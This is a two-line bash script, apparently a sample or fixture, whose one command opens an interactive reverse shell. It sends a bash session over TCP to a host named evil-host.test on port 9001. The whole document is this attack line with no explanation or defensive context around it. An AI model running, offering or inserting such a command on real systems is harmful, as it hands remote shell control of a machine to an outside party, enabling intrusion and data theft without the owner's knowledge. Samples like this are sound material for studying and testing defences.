#!/bin/bash
bash -i >& /dev/tcp/evil-host.test/9001 0>&1
